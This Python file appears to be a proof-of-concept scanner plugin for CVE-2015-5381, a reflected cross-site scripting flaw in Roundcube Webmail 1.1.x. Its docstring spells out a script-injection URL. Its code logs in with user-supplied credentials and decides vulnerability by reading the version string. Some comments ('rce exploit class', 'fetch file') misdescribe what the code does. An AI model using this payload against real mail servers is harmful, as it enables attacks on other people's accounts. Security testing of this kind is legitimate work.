#!/usr/bin/env python
# -*- coding:utf-8 -*-

import requests
import time

"""
    Roundcube Webmail Cross-site scripting(CVE-2015-5381)
    ------------
    CVE : CVE-2015-5381
    Affected Versions: 1.1.x < 1.1.2

    Requirements
    ------------
    - email account : username / password

    References :
        https://github.com/roundcube/roundcubemail/issues/4837
        http://www.cnblogs.com/Hi-blog/p/8776374.html

    Exploit(better check with burpsuite and firefox)
        check url http://your-roundcubemail/?_task=mail&_mbox=INBOX"><script>alert("Roundcube+v1.1.1+XSS")<%2Fscript>
        login with valid username and password

"""

description = "Roundcube Webmail Cross-site scripting(CVE-2015-5381)"

url = 'http://mail.roundcube.com/roundcubemail/'


class roundcube():
    """
    roundcube rce exploit class
    """
    def init(self, url):
        """
        init some basic args
        """
        # self.base_url = 'http://mail.roundcube.com/roundcubemail/'
        self.base_url = '{}'.format(url)
        print('base_url : {}'.format(self.base_url))

        # self.url_login = 'http://mail.roundcube.com/roundcubemail/?_task=login'
        self.url_login = '{}/?_task=login'.format(self.base_url)
        print('url_login : {}'.format(self.url_login))

        self.s = requests.Session()
        self.csrf_token = ''

        # 加headers 伪造请求头。
        self.s.headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:59.0) Gecko/20100101 Firefox/59.0',
        }

    def get_csrf_token(self, content):
        """
        登陆时需要先获取CSRF-Token
        :return: csrf-token
        """
        index = content.find('request_token')
        self.csrf_token = content[index+16:index+16+32]
        print('csrf_token : {}\n'.format(self.csrf_token))
        return self.csrf_token

    def login(self):
        """
        Login to Roundcube Webmail
        :return: None
        """
        _user = input('please input username : ')
        _pass = input('please input password : ')

        # self.path = input('please input webmail path(eg./var/www/html/roundcubemail) : ')

        form_data = {
            '_token': self.csrf_token,
            '_task': 'login',
            '_action': 'login',
            '_timezone': 'Asia/Shanghai',
            '_url': '_task=login',
            '_user': _user,
            '_pass': _pass
        }
        # print(form_data)
        request = self.s.post(self.url_login, data=form_data)
        content = request.text
        self.get_csrf_token(content)
        # print(content)

    def check_version(self, url):
        print('step 3 : check xss {}'.format(url))
        url = '{}{}'.format(url, '/?_task=settings&_action=about')
        print('url : {}'.format(url))
        req = self.s.get(url, timeout=3)
        print(req.status_code)
        content = req.text
        index = content.find('sysname') + 9
        end = content[index:].find('</h2>')
        version = content[index:index+end]
        if '1.1.1' in version or '1.1.2' in version:
            return True

    def auto_exploit(self, url):
        """
        Auto exploit Roundcube Webmail base on self class functions
        :param url: the remote system to test
        :return: True
        """

        # initialize
        self.init(url)

        # step1 : get csrf_token for login
        print('step 1 : {}'.format(self.base_url))
        content = self.s.get(self.base_url).text
        self.get_csrf_token(content)

        print('step 2 : {}'.format(self.url_login))
        self.login()

        # try to fetch file
        return self.check_version(url)


def poc(url):

    # just give roundcubemail url
    url = 'http://{}'.format(url)

    try:
        return roundcube().auto_exploit(url)
    except:
        return False

